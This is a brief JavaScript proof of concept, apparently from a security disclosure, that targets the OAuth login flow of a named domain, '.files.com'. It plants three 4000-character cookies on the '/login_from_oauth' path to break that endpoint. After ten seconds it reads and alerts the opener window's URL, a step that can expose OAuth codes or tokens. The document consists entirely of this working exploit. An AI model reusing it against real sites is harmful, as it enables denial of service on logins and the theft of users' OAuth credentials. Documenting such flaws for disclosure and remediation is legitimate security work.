for (let i = 1; i < 4; i++)
  document.cookie = `DoS_POC${i > 1 ? i : ""}=${"w".repeat(4000)};Path=/login_from_oauth;Domain=.files.com`;
// wait 10 seconds
await new Promise(resolve => setTimeout(resolve, 10000));
alert(window.opener.location.href);
